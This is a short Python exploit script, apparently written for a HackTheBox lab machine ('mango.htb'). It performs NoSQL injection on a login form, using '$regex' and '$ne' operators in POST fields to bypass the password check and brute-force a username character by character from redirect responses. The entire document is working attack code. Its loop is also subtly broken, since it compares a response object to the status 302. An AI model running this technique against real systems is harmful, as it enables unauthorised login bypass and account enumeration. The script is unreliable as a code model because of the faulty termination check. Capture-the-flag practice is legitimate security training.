#!/usr/bin/python3
import requests, string
url = 'http://staging-order.mango.htb'

def inject(user,letter):
    escapechars = ['.','^','|','*','+','?','$']
    if letter in escapechars:
        letter = '\\' + letter

    data = { 'username[$regex]': '^' + user + letter + '.*$', 'password[$ne]': 'notpass', 'login':'login' }
    r = requests.post(url, data, allow_redirects=False)
    if r.status_code == 302:
        return True

    else:
        return False


user = 'm'

while True:
    checkdone = r = requests.post(url, { 'username[$regex]': '^' + user + '$', 'password[$ne]': 'notpass', 'login':'login' }, allow_redirects=False)
    while checkdone != 302:
        for i in range(33,126):
            letter = chr(i)
            passed = inject(user,letter)
            if passed == True:
                user = user + letter
                print(" new user: " + user)
                break
            
